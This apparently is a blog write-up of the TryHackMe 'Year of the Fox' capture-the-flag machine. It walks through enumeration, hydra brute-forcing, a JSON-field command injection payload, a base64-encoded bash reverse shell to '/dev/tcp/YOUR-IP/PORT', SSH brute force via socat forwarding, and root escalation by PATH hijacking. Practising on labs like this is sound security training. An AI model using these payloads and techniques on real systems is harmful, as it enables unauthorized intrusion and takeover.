---
title: "Year of the Fox"
date: 2023-07-12T16:10:31+05:30
draft: false
toc: true
images:
tags:
  - Writeups
  - TryHackMe
---
Machine URL :: [Year of the Fox](https://tryhackme.com/room/yotf)
## ENUMERATION
Starting with an nmap scan as always:
```bash
PORT      STATE    SERVICE     VERSION
80/tcp    open     http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
2725/tcp  filtered msolap-ptp2
49159/tcp filtered unknown
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-time: 
|   date: 2023-07-11T10:56:50
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: mean: -19m57s, deviation: 34m39s, median: 2s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-07-11T11:56:49+01:00
```
Taking a look at the webserver first:
{{< image src="/images/fox/6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We don't have any credentials to work with for now so let's move on to Samba.

## SAMBA
Use enum4linux to enumerate SMB shares:

{{< image src="/images/fox/4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We got 2 users :
{{< image src="/images/fox/5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

You can try to bruteforce smb using user fox but its time consuming.
## ACTIVE ENUMERATION
Use hydra to bruteforce web login. It works with user rascal but the password changes everytime we restart the machine.

{{< image src="/images/fox/7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

The website:
{{< image src="/images/fox/1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Search an empty string and you can see the expected input is files. Also , seems like it doesn't like some characters.

{{< image src="/images/fox/2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Intercepting request with Burp:
{{< image src="/images/fox/3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Now , I used intruder to launch a simple SQL injection fuzzing but got nothing. So now onto command injection. You can run some commands using : 
```plain-text
{"target":"\"; COMMAND \""}
```
Used RCE Command : `bash -i >& /dev/tcp/YOUR-IP/PORT 0>&1` but got invalid-character response so used base 64.

{{< image src="/images/fox/9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Use burp repeater:

{{< image src="/images/fox/8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We gain an RCE:

{{< image src="/images/fox/10.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

And there we get our first flag!
## FOOTHOLD
Check all processes which are running:

{{< image src="/images/fox/11.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

There seems to be SSH running on port 22 and can be confirmed in `/etc/ssh/sshd_config` file which also tells us that only user fox can use it. We can use this.
Use socat as a TCP port forwarder. Here socat listens on port 2222 , accepts connections and forwards connections to port 22 on remote host.

{{< image src="/images/fox/12.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We've established a connection. Now time to bruteforce :

{{< image src="/images/fox/13.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Sweet! Now SSH as User fox :

{{< image src="/images/fox/14.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

And there we have our second flag!
Now see all the commands user fox can run : `sudo -l`

{{< image src="/images/fox/15.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We can run shutdown as root without password. GTFObins doesn't give anything. Dragging the file onto our machine so we can analyze it.
Use Radare2 :
```
r2 -AAAA /tmp/shutdown
pdg
```
And looks like this binary is calling the `poweroff` binary which doesn't seem to be using an absolute path. So, we can use PATH manipulation to spawn a root shell. Here we are copying /bin/bash to our own version of `/tmp/poweroff` and adding that to `$PATH `so that when it searches for the poweroff binary it searches the /tmp directory first.

{{< image src="/images/fox/16.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

And there we have our root shell.

{{< image src="/images/fox/17.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}
\
{{< image src="/images/fox/18.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Also found this :

{{< image src="/images/fox/19.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}